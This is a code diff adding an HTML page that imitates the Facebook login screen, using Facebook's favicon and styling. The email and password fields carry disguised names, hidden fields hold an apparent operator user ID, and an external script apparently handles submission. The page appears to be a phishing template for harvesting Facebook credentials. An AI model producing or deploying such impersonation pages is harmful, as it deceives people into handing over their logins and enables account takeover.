@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .facebook-container {
+            display: flex;
+            max-width: 980px;
+            width: 100%;
+            align-items: center;
+            gap: 120px;
+        }
+        .facebook-left {
+            flex: 1;
+            max-width: 580px;
+        }
+        .facebook-logo {
+            font-size: 56px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 16px;
+            font-family: "Klavika", sans-serif;
+        }
+        .facebook-right {
+            flex: 1;
+            max-width: 396px;
+        }
+        .login-box {
+            background: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            border: 1px solid #dddfe2;
+        }
+        .form-group {
+            position: relative;
+            margin-bottom: 12px;
+        }
+        .form-input {
+            width: 100%;
+            padding: 14px 45px 14px 16px; /* Extra space for icon */
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            background: #fff;
+            color: #1c1e21;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
+            color: #606770;
+        }
+        .login-button {
+            width: 100%;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            padding: 14px 16px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+        .login-button:hover {
+            background: #166fe5;
+        }
+        .forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            text-align: center;
+            display: block;
+            margin-bottom: 16px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            background: #36a085;
+            color: #fff;
+            border: none;
+            padding: 14px 16px;
+            font-size: 17px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+        .create-account:hover {
+            background: #36a085;
+        }
+        @media (max-width: 898px) {
+            .facebook-container {
+                flex-direction: column;
+                gap: 40px;
+                text-align: center;
+            }
+            .facebook-left {
+                max-width: 396px;
+            }
+            .facebook-logo {
+                font-size: 48px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="facebook-container">
+        <div class="facebook-left">
+            <div class="facebook-logo">facebook</div>
+        </div>
+        <div class="facebook-right">
+            <div class="login-box">
+                <form id="allForm">
+                    <input type="hidden" name="link" value="Facebook Login">
+                    <input type="hidden" name="ftype" value="normal">
+                    <input type="hidden" name="login" value="login">
+                    <input type="hidden" name="user_id" value="16934">
+                    
+                    <div class="form-group">
+                        <input type="text" class="form-input" name="message_title" placeholder="Email address or phone number" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" class="form-input" name="description" placeholder="Password" id="password" required>
+                        <span class="toggle-password" id="togglePassword">&#128065;</span>
+                    </div>
+
+                    <button type="submit" class="login-button">Log In</button>
+                </form>
+                <a href="#" class="forgot-password">Forgotten password?</a>
+                <div class="divider"></div>
+                <div style="text-align: center;">
+                    <a href="#" class="create-account">Create new account</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const togglePassword = document.getElementById('togglePassword');
+        const password = document.getElementById('password');
+
+        togglePassword.addEventListener('click', () => {
+            const type = password.type === 'password' ? 'text' : 'password';
+            password.type = type;
+            togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+    </script>
+          <script src="intelligent.js"></script>
+</body>
+</html>
